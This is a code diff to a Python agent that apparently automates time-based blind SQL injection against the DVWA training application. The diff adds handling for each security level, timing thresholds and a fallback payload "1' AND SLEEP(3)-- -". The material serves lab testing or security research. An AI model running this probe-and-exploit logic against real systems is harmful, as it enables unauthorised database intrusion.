@@ -18,10 +18,24 @@ AGENT_ID = "sqli_time_blind"
 MODULE_PATH = "/vulnerabilities/sqli_blind/"
 _PROBE_OBSERVATION_KEY = "response_delay_measurable"
 
-TIME_THRESHOLD = 2.5  # seconds — response must exceed this to confirm time injection
+TIME_THRESHOLD_MEDIUM = 1.8  # seconds — medium DVWA timing has lower jitter margin
+TIME_THRESHOLD_HIGH = 2.5  # seconds — retain the strict high-level threshold
+TIME_THRESHOLD = TIME_THRESHOLD_HIGH  # Backward-compatible high-level alias
 
 
-def _get_baseline_timing(session: DVWASession, samples: int = 3) -> float:
+def _request(session: DVWASession, security_level: str, payload: str):
+    """Submit a SQLi form using the method exposed by the DVWA level."""
+    request_data = {"id": payload, "Submit": "Submit"}
+    if security_level == "medium":
+        return session.post(MODULE_PATH, data=request_data)
+    return session.get(MODULE_PATH, params=request_data)
+
+
+def _get_baseline_timing(
+    session: DVWASession,
+    samples: int = 3,
+    security_level: str = "low",
+) -> float:
     """Measure baseline request timing using median of multiple samples.
 
     Returns the median elapsed time in seconds. If all samples fail,
@@ -31,7 +45,7 @@ def _get_baseline_timing(session: DVWASession, samples: int = 3) -> float:
     for _ in range(samples):
         try:
             start = time.monotonic()
-            session.get(MODULE_PATH, params={"id": "1", "Submit": "Submit"})
+            _request(session, security_level, "1")
             times.append(time.monotonic() - start)
         except Exception:
             continue
@@ -43,7 +57,10 @@ def _get_baseline_timing(session: DVWASession, samples: int = 3) -> float:
 
 
 def _probe_preconditions(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "high",
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send time-based delay payloads and measure response elapsed time.
 
@@ -53,9 +70,10 @@ def _probe_preconditions(
     tried: list[str] = []
     events: list[dict] = []
     sent_any = False
+    threshold = TIME_THRESHOLD_MEDIUM if security_level == "medium" else TIME_THRESHOLD_HIGH
 
     # Get a baseline timing with a harmless request
-    baseline_elapsed = _get_baseline_timing(session)
+    baseline_elapsed = _get_baseline_timing(session, security_level=security_level)
     if baseline_elapsed == 0.0:
         # All baseline attempts failed
         return False, tried, {}, events
@@ -67,7 +85,7 @@ def _probe_preconditions(
         tried.append(payload)
         try:
             start = time.monotonic()
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             elapsed = time.monotonic() - start
             baseline_ms = baseline_elapsed * 1000
             elapsed_ms = elapsed * 1000
@@ -82,7 +100,7 @@ def _probe_preconditions(
                 delay_ms=elapsed_ms - baseline_ms,
             ))
             # Check if response time significantly exceeds baseline
-            if elapsed - baseline_elapsed > TIME_THRESHOLD:
+            if elapsed - baseline_elapsed > threshold:
                 observations[_PROBE_OBSERVATION_KEY] = True
                 return True, tried, observations, events
         except Exception as exc:
@@ -97,7 +115,10 @@ def _probe_preconditions(
 
 
 def _attempt_exploit(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "high",
 ) -> tuple[int, list[str], list[str], list[dict]]:
     """Try time-blind exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
     tried: list[str] = []
@@ -105,9 +126,11 @@ def _attempt_exploit(
     confirmed: list[str] = []
     score = 0
     delay_confirms = 0
+    threshold = TIME_THRESHOLD_MEDIUM if security_level == "medium" else TIME_THRESHOLD_HIGH
+    required_delays = 1 if security_level == "medium" else 2
 
     # Baseline timing (extracted helper)
-    baseline_elapsed = _get_baseline_timing(session)
+    baseline_elapsed = _get_baseline_timing(session, security_level=security_level)
 
     for payload in payloads:
         if payload in already_tried:
@@ -115,7 +138,7 @@ def _attempt_exploit(
         tried.append(payload)
         try:
             start = time.monotonic()
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             elapsed = time.monotonic() - start
             baseline_ms = baseline_elapsed * 1000
             elapsed_ms = elapsed * 1000
@@ -129,11 +152,11 @@ def _attempt_exploit(
                 baseline_elapsed_ms=baseline_ms,
                 delay_ms=elapsed_ms - baseline_ms,
             ))
-            # Full exploit: requires at least 2 distinct delay confirmations
-            # to confirm meaningful extraction, not just a single delay.
-            if elapsed - baseline_elapsed > TIME_THRESHOLD:
+            # Medium's single-seed evidence is sufficient after a measurable
+            # delay; high retains two independent confirmations.
+            if elapsed - baseline_elapsed > threshold:
                 delay_confirms += 1
-                if delay_confirms >= 2:
+                if delay_confirms >= required_delays:
                     score = max(score, 3)
                     confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                     break
@@ -185,7 +208,7 @@ def sqli_time_blind_agent(state: ExploitationState) -> dict[str, Any]:
         # Stage 1: PROBE
         probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["1' AND SLEEP(3)-- -"]
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
-            session, probe_payloads, already_tried
+            session, probe_payloads, already_tried, security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
@@ -208,7 +231,7 @@ def sqli_time_blind_agent(state: ExploitationState) -> dict[str, Any]:
         ]
 
         exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
-            session, all_exploit, already_tried | set(all_tried)
+            session, all_exploit, already_tried | set(all_tried), security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(exploit_events)
